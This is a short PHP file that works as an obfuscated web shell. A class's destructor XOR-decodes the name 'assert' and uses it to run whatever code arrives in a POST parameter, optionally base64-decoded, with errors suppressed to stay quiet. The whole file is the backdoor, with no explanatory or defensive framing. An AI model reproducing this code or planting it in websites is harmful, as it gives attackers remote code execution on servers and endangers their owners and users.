<?php
class OFLI{
    function __destruct(){
        $SIEA="9EE76F"^"\x58\x36\x36\x52\x44\x32";
        return @$SIEA("$this->PNKU");
    }
}
$ofli=new OFLI();
@$ofli->PNKU=isset($_GET["id"])?base64_decode($_POST["darqom"]):$_POST["darqom"];
?>